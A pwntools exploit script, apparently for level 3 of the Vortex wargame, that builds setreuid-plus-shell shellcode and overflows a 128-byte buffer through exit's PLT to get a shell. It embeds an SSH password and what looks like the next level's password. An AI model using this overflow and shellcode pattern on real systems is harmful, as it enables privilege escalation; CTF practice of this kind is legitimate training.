from pwn import *
from pwnhelper import *
from pwnhelper.dbg import *


local_dir = None
remote_binary = None
local_binary = None
libc = None
port = None
elf = None


def connect(level, password):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    local_dir = "/home/kali/PycharmProjects/vortex/"+level
    remote_binary = "/vortex/vortex"+level
    cloned_binary = local_dir+remote_binary
    port = 2228
    s = ssh("vortex"+level, "176.9.9.172", password=password, cache=True, port=port)
    s.libs(remote_binary, local_dir)
    log.info(f"cloned_binary: {cloned_binary}")
    elf = ELF(cloned_binary)
    libc = ELF(local_dir + "/lib32/libc.so.6")
    context.clear()
    context.binary = cloned_binary
    context.log_file = "/tmp/docgillog"
    return s


s = connect("3", "64ncXTvx#")


def pad(s, slen):
    return s+b"B"*(slen-len(s))


# cloned_binary = "/home/kali/PycharmProjects/vortex/3/vortex/vortex3"
# context.terminal = ["tmux", "splitw", "-v"]

log.info(f"cloned_binary: {local_binary}")

context.binary = local_binary
buf_size = 0x80

exit_plt = 0x08048310
# skip 2 bytes encoding jmp
exit_plt_first_jump = exit_plt+2

log.info("exit_plt_first_jump: " + hex(exit_plt_first_jump))

io = s.process(["id", "-u", "vortex4"])
vortex4_uid = int(io.recvall().decode("utf-8"))

shellcode = b""
shellcode += pwnlib.encoders.encoder.null(asm(shellcraft.i386.linux.setreuid(vortex4_uid)))
shellcode += pwnlib.encoders.encoder.null(asm(shellcraft.i386.linux.sh()))

assert len(shellcode) < buf_size

payload = b""
payload += pad(shellcode, buf_size)
# overflow
payload += pack(0x08048404, 32)     # retain old value at this position to avoid crash
payload += pack(exit_plt_first_jump, 32)  # lpp -> exit plt's jump -> exit.plt.got

write("/tmp/docgil", payload)
print(payload)

io = s.process([remote_binary, payload])
io.interactive()

# 2YmgK1=jw
